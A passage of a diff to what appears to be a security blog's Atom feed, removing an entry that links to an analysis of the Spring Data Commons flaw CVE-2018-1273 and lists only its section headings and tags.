href="http://xxlegend.com/2018/04/12/CVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" target="_blank" rel="noopener">http://xxlegend.com/2018/04/12/CVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</a></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;!-- toc --&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#漏洞概述&quot;&gt;漏洞概述&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#影响范围&quot;&gt;影响范围&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#复现环境&quot;&gt;复现环境&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#漏洞复现&quot;
-      
-    
-    </summary>
-    
-    
-      <category term="CVE-2018" scheme="http://www.vkxss.top/categories/CVE-2018/"/>
-    
-    
-      <category term="CVE-2018-1273" scheme="http://www.vkxss.top/tags/CVE-2018-1273/"/>
     
   </entry>
   
